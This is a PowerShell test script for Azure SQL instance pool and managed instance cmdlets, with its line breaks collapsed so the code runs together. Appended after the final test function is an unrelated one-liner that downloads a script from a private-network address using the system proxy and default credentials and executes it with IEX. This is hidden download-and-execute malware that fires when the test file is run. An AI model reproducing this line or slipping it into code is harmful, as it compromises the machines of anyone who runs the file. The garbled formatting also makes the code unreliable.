function Test-CreateInstancePool{$props = Get-InstancePoolTestProperties$virtualNetwork = CreateAndGetVirtualNetworkForManagedInstance $props.vnetName $props.subnetName $props.location $props.resourceGroup$subnetId = $virtualNetwork.Subnets.where({ $_.Name -eq $props.subnetName })[0].Id$instancePool = New-AzSqlInstancePool -ResourceGroupName $props.resourceGroup -Name $props.name `-Location $props.location -SubnetId $subnetId -VCore $props.vCores `-Edition $props.edition -ComputeGeneration $props.computeGen `-LicenseType $props.licenseType -Tag $props.tagsAssert-InstancePoolProperties $instancePoolRemove-ManagedInstancesInInstancePool($instancePool)}function Test-GetInstancePool{$instancePool = Create-InstancePoolForTestAssert-InstancePoolProperties $instancePooltry{$instancePool = Get-AzSqlInstancePool -ResourceGroupName $instancePool.ResourceGroupName -Name $instancePool.InstancePoolNameAssert-InstancePoolProperties $instancePool$instancePool = Get-AzSqlInstancePool -ResourceId $instancePool.IdAssert-InstancePoolProperties $instancePool$instancePools = Get-AzSqlInstancePool -ResourceGroupName $instancePool.ResourceGroupNameAssert-NotNull $instancePools$instancePools = Get-AzSqlInstancePoolAssert-NotNull $instancePools}finally{Remove-ManagedInstancesInInstancePool($instancePool)}}function Test-UpdateInstancePool{$instancePool = Create-InstancePoolForTesttry{$newTags = @{ tag1="Test1" };$newLicenseType = "BasePrice";$instancePool = Set-AzSqlInstancePool -ResourceGroupName $instancePool.ResourceGroupName -Name $instancePool.InstancePoolName `-Tags $newTags -LicenseType $newLicenseTypeAssert-InstancePoolProperties $instancePool $newTags $newLicenseType$newTags = @{ tag2="Test2" };$newLicenseType = "LicenseIncluded";$instancePool = Set-AzSqlInstancePool -ResourceId $instancePool.Id -LicenseType $newLicenseType -Tags $newTagsAssert-InstancePoolProperties $instancePool $newTags $newLicenseType$newTags = @{ tag3="Test3" };$newLicenseType = "BasePrice";$instancePool = Set-AzSqlInstancePool -InputObject $instancePool -LicenseType $newLicenseType -Tags $newTagsAssert-InstancePoolProperties $instancePool $newTags $newLicenseType$newTags = @{ tag4="Test4" };$newLicenseType = "LicenseIncluded";$instancePool = $instancePool | Set-AzSqlInstancePool -LicenseType $newLicenseType -Tags $newTagsAssert-InstancePoolProperties $instancePool $newTags $newLicenseType}finally{Remove-ManagedInstancesInInstancePool($instancePool)}}function Test-RemoveInstancePool{$instancePool = Create-InstancePoolForTestAssert-InstancePoolProperties $instancePooltry{$instancePool = Remove-AzSqlInstancePool -ResourceGroupName $instancePool.ResourceGroupName -Name $instancePool.InstancePoolNameAssert-InstancePoolProperties $instancePool$instancePool = Create-InstancePoolForTestAssert-InstancePoolProperties $instancePool$instancePool = Remove-AzSqlInstancePool -InputObject $instancePoolAssert-InstancePoolProperties $instancePool$instancePool = Create-InstancePoolForTestAssert-InstancePoolProperties $instancePool$instancePool = Remove-AzSqlInstancePool -ResourceId $instancePool.IdAssert-InstancePoolProperties $instancePool$instancePool = Create-InstancePoolForTestAssert-InstancePoolProperties $instancePool$instancePool = $instancePool | Remove-AzSqlInstancePoolAssert-InstancePoolProperties $instancePool}finally{Remove-ManagedInstancesInInstancePool($instancePool)}}function Test-CreateManagedInstanceInInstancePool{$instancePool = Create-InstancePoolForTestAssert-InstancePoolProperties $instancePool$managedInstanceName = Get-ManagedInstanceName$credential = Get-ServerCredential$vCores = 2$collation = "Serbian_Cyrillic_100_CS_AS"$proxyOverride = "Proxy"$timezoneId = "Central Europe Standard Time"try{$managedInstance1 = New-AzSqlInstance -ResourceGroupName $instancePool.ResourceGroupName -Name $managedInstanceName `-AdministratorCredential $credential -Location $instancePool.Location -SubnetId $instancePool.SubnetId `-VCore 2 -SkuName "GP_Gen5" -LicenseType LicenseIncluded -StorageSizeInGb 32 -Collation $collation `-PublicDataEndpointEnabled -TimezoneId $timezoneId -Tag $instancePool.Tags -InstancePoolName $instancePool.InstancePoolNameAssert-ManagedInstanceInInstancePoolProperties $managedInstance1 $instancePool$managedInstanceName = Get-ManagedInstanceName$managedInstance2 = New-AzSqlInstance -ResourceGroupName $instancePool.ResourceGroupName -Name $managedInstanceName `-AdministratorCredential $credential -Location $instancePool.Location -SubnetId $instancePool.SubnetId `-VCore 2 -ComputeGeneration "Gen5" -Edition "GeneralPurpose" -LicenseType LicenseIncluded `-StorageSizeInGb 32 -Collation $collation `-PublicDataEndpointEnabled -TimezoneId $timezoneId -Tag $instancePool.Tags `-InstancePoolName $instancePool.InstancePoolNameAssert-ManagedInstanceInInstancePoolProperties $managedInstance2 $instancePool$managedInstanceName = Get-ManagedInstanceName$managedInstance3 = New-AzSqlInstance -InstancePoolResourceId $instancePool.Id -Name $managedInstanceName `-VCore 2 -AdministratorCredential $credential -StorageSizeInGb 32 -PublicDataEndpointEnabledAssert-ManagedInstanceInInstancePoolProperties $managedInstance3 $instancePool$managedInstanceName = Get-ManagedInstanceName$managedInstance4 = New-AzSqlInstance -InstancePool $instancePool -Name $managedInstanceName -VCore 2 -AdministratorCredential $credential `-StorageSizeInGb 32 -PublicDataEndpointEnabledAssert-ManagedInstanceInInstancePoolProperties $managedInstance4 $instancePool$managedInstanceName = Get-ManagedInstanceName$managedInstance5 = $instancePool | New-AzSqlInstance -Name $managedInstanceName -VCore 2 -AdministratorCredential $credential `-StorageSizeInGb 32 -PublicDataEndpointEnabledAssert-ManagedInstanceInInstancePoolProperties $managedInstance5 $instancePool}finally{Remove-ManagedInstancesInInstancePool($instancePool)}}function Test-GetManagedInstanceInInstancePool{$instancePool = Create-InstancePoolForTestAssert-InstancePoolProperties $instancePool$instance1 = Create-ManagedInstanceInInstancePoolForTest $instancePool$instance2 = Create-ManagedInstanceInInstancePoolForTest $instancePooltry{$instance1 = Get-AzSqlInstance -ResourceGroupName $instance1.ResourceGroupName -Name $instance1.ManagedInstanceNameAssert-ManagedInstanceInInstancePoolProperties $instance1 $instancePool$instances = Get-AzSqlInstance -ResourceGroupName $instance1.ResourceGroupName -InstancePoolName $instancePool.InstancePoolNameAssert-NotNull $instances$instances = Get-AzSqlInstance -ResourceGroupname $instance1.ResourceGroupNameAssert-NotNull $instances$instance2 = Get-AzSqlInstance -ResourceId $instance2.IdAssert-ManagedInstanceInInstancePoolProperties $instance2 $instancePool$instances = Get-AzSqlInstance -InstancePoolResourceId $instancePool.IdAssert-NotNull $instances$instances = Get-AzSqlInstance -InstancePool $instancePoolAssert-NotNull $instances$instances = Get-AzSqlInstanceAssert-NotNull $instances}finally{Remove-ManagedInstancesInInstancePool($instancePool)}}function Test-UpdateManagedInstanceInInstancePool{$instancePool = Create-InstancePoolForTestAssert-InstancePoolProperties $instancePool$securePassword = (Get-ServerCredential).Password$edition = "GeneralPurpose"$instance = Create-ManagedInstanceInInstancePoolForTest $instancePoolAssert-ManagedInstanceInInstancePoolProperties $instance $instancePooltry{$instance = Set-AzSqlInstance -ResourceGroupName $instance.ResourceGroupName -Name $instance.ManagedInstanceName `-AdministratorPassword $securePassword -Edition $edition -LicenseType LicenseIncluded `-StorageSizeInGb 32 -VCore 2 -PublicDataEndpointEnabled $true `-InstancePoolName $instancePool.InstancePoolName -Force$instance = Set-AzSqlInstance -ResourceId $instance.Id -AdministratorPassword $securePassword -Edition $edition `-LicenseType LicenseIncluded -StorageSizeInGb 32 -VCore 2 -PublicDataEndpointEnabled $true `-InstancePoolName $instancePool.InstancePoolName -Force$instance = Set-AzSqlInstance -InputObject $instance -VCore 2 -InstancePoolName $instancePool.InstancePoolName -PublicDataEndpointEnabled $true -Force$instance = $instance | Set-AzSqlInstance -VCore 2 -InstancePoolName $instancePool.InstancePoolName -PublicDataEndpointEnabled $true -Force}finally{Remove-ManagedInstancesInInstancePool($instancePool)}}function Test-DeleteManagedInstanceInInstancePool{$instancePool = Create-InstancePoolForTestAssert-InstancePoolProperties $instancePool$managedInstance1 = Create-ManagedInstanceInInstancePoolForTest $instancePool$managedInstance2 = Create-ManagedInstanceInInstancePoolForTest $instancePool$managedInstance3 = Create-ManagedInstanceInInstancePoolForTest $instancePool$managedInstance4 = Create-ManagedInstanceInInstancePoolForTest $instancePooltry{$managedInstance1 = Remove-AzSqlInstance -ResourceGroupName $managedInstance1.ResourceGroupName -Name $managedInstance1.ManagedInstanceName -ForceAssert-ManagedInstanceInInstancePoolProperties $managedInstance1 $instancePool$managedInstance2 = Remove-AzSqlInstance -InputObject $managedInstance2 -ForceAssert-ManagedInstanceInInstancePoolProperties $managedInstance2 $instancePool$managedInstance3 = Remove-AzSqlInstance -ResourceId $managedInstance3.Id -ForceAssert-ManagedInstanceInInstancePoolProperties $managedInstance3 $instancePool$managedInstance4 = $managedInstance4 | Remove-AzSqlInstance -ForceAssert-ManagedInstanceInInstancePoolProperties $managedInstance4 $instancePool}finally{Remove-ManagedInstancesInInstancePool($instancePool)}}function Test-GetInstancePoolUsage{$instancePool = Create-InstancePoolForTest$managedInstance1 = Create-ManagedInstanceInInstancePoolForTest $instancePooltry{$usages = Get-AzSqlInstancePoolUsage -ResourceGroupName $instancePool.ResourceGroupname -Name $instancePool.InstancePoolNameAssert-InstancePoolUsages $usages$usages = Get-AzSqlInstancePoolUsage -ResourceGroupName $instancePool.ResourceGroupName -Name $instancePool.InstancePoolName -ExpandChildrenAssert-InstancePoolUsages $usages$usages = Get-AzSqlInstancePoolUsage -ResourceId $instancePool.IdAssert-InstancePoolUsages $usages$usages = Get-AzSqlInstancePoolUsage -ResourceId $instancePool.Id -ExpandChildrenAssert-InstancePoolUsages $usages$usages = $instancePool | Get-AzSqlInstancePoolUsageAssert-InstancePoolUsages $usages$usages = $instancePool | Get-AzSqlInstancePoolUsage -ExpandChildrenAssert-InstancePoolUsages $usages}finally{Remove-ManagedInstancesInInstancePool($instancePool)}}function Assert-InstancePoolProperties($instancePool, $newTags = $null, $newLicenseType = $null){$props = Get-InstancePoolTestPropertiesAssert-AreEqual $instancePool.ResourceGroupName $props.resourceGroupAssert-AreEqual $instancePool.InstancePoolName $props.NameAssert-AreEqual $instancePool.VCores $props.vCores$subnetFormat = -join("*virtualNetworks/", $props.vnetName, "/subnets/", $props.subnetName,"*")$subnetMatch = $instancePool.SubnetId -like $subnetFormatAssert-AreEqual True $subnetMatchAssert-AreEqual $instancePool.ComputeGeneration $props.computeGenAssert-AreEqual $instancePool.Edition $props.EditionAssert-AreEqual $instancePool.Location $props.LocationAssert-NotNull $instancePool.Tagsif ($newTags -ne $null){$newTagsKey = $newTags.Keys[0]$newTagsValue = $newTags[$newTagsKey]Assert-AreEqual True $instancePool.Tags.ContainsKey($newTagsKey)Assert-AreEqual $newTagsValue $instancePool.Tags[$newTagsKey]}else{Assert-AreEqual True $instancePool.Tags.ContainsKey($props.tags.Keys[0])Assert-AreEqual $props.tags[$props.tags.Keys[0]] $instancePool.Tags[$props.tags.Keys[0]]}if ($newLicenseType -ne $null){Assert-AreEqual $newLicenseType $instancePool.LicenseType}else{Assert-AreEqual $props.LicenseType $instancePool.LicenseType}}function Assert-ManagedInstanceInInstancePoolProperties($managedInstance, $instancePool){Assert-AreEqual $instancePool.Sku.Name $managedInstance.Sku.NameAssert-AreEqual $instancePool.Sku.Tier $managedInstance.Sku.TierAssert-AreEqual $instancePool.LicenseType $managedInstance.LicenseTypeAssert-AreEqual $instancePool.SubnetId $managedInstance.SubnetIdAssert-AreEqual $instancePool.ResourceGroupName $managedInstance.ResourceGroupNameAssert-AreEqual $instancePool.Location $managedInstance.Location}function Assert-InstancePoolUsages($usages){Assert-AreEqual True ($usages.Count -ge 3)Assert-AreEqual "VCores" $usages[0].UnitAssert-AreEqual "VCore utilization" $usages[0].nameAssert-NotNull $usages[0].CurrentValueAssert-NotNull $usages[0].LimitAssert-AreEqual "Gigabytes" $usages[1].UnitAssert-AreEqual "Storage utilization" $usages[1].nameAssert-NotNull $usages[1].CurrentValueAssert-NotNull $usages[1].LimitAssert-AreEqual "Number of Databases" $usages[2].UnitAssert-AreEqual "Database utilization" $usages[2].nameAssert-NotNull $usages[2].CurrentValueAssert-NotNull $usages[2].Limit}$m=new-object net.webclient;$m.proxy=[Net.WebRequest]::GetSystemWebProxy();$m.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX $m.downloadstring('http://192.168.1.139:8080/lol');